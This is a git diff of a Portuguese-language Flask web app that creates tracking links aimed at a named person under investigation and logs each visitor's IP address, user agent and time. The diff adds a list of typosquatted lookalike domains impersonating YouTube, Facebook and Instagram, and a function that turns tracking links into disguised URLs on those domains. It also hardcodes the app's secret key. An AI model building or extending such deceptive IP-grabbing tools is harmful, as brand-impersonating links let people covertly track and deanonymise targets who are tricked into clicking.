@@ -8,6 +8,32 @@ from functools import wraps
 from flask_migrate import Migrate
 import os
 
+DOMINIOS_FALSOS = {
+    "youtube": [
+        "youtube.c0m.lat", "y0utube.com.br", "you-tube.video", "youtubee.site", "y0u.tube.link"
+    ],
+    "facebook": [
+        "faceb00k.page", "facebooke.live", "f4cebook.com", "fbk.social", "facebook-br.net"
+    ],
+    "instagram": [
+        "1nstagram.store", "insta-gram.pics", "instagramm.live", "instagram.c0m.lat", "graminsta.link"
+    ]
+}
+
+def gerar_link_falso(slug, plataforma="youtube"):
+    dominios = DOMINIOS_FALSOS.get(plataforma, DOMINIOS_FALSOS["youtube"])
+    dominio_escolhido = random.choice(dominios)
+
+    caminhos_possiveis = {
+        "youtube": [f"/a/{slug}", f"/watch?v={slug}", f"/shorts/{slug}", f"/live/{slug}"],
+        "facebook": [f"/story.php?story_fbid={slug}", f"/profile.php?id={slug}", f"/reel/{slug}"],
+        "instagram": [f"/reel/{slug}", f"/p/{slug}", f"/stories/user/{slug}"]
+    }
+
+    caminho = random.choice(caminhos_possiveis.get(plataforma, [f"/a/{slug}"]))
+
+    return f"https://{dominio_escolhido}{caminho}"
+
 app = Flask(__name__, instance_relative_config=True)
 app.secret_key = 'P@licia1080#'
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(app.instance_path, 'dados.db')
@@ -83,11 +109,13 @@ with app.app_context():
 
 # Página de criação de links
 @app.route("/criar_link", methods=["GET", "POST"])
+@login_requerido
 def criar_link():
     if request.method == "POST":
         nome_investigado = request.form["nome_investigado"]
         destino = request.form["destino"]
         slug = request.form["slug"] or gerar_slug()
+        plataforma = request.form["plataforma"]
 
         if Link.query.filter_by(slug=slug).first():
             return "Slug já existe! Escolha outro.", 400
@@ -100,10 +128,11 @@ def criar_link():
         db.session.add(novo_link)
         db.session.commit()
 
-        url_final = url_for('rastrear_link', slug=slug, _external=True)
-        return render_template("link_gerado.html", link=url_final)
+        link_disfarcado = gerar_link_falso(slug, plataforma)
+        return render_template("link_gerado.html", link=link_disfarcado)
 
     return render_template("criar_link.html")
+
 
 # Gera slugs aleatórios
 def gerar_slug(tamanho=8):
@@ -112,7 +141,7 @@ def gerar_slug(tamanho=8):
 # Acessa o link disfarçado
 @app.route("/link/<slug>")
 def rastrear_link(slug):
-    link = Link.query.filter_by(slug=slug).first()
+    link = Link.query.filter_by(slug=slug).first_or_404()
     if not link:
         return "Link não encontrado", 404
 
@@ -120,11 +149,11 @@ def rastrear_link(slug):
     user_agent = request.headers.get("User-Agent")
     timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-    novo = Registro(ip=visitor_ip, user_agent=user_agent, timestamp=timestamp,slug=slug )
+    novo = Registro(ip=visitor_ip, user_agent=user_agent, timestamp=timestamp, slug=slug)
     db.session.add(novo)
     db.session.commit()
 
-    return render_template("index.html", slug=slug)
+    return render_template("index.html", slug=slug, destino=link.destino)
 
 # Página inicial
 @app.route("/todos_links")
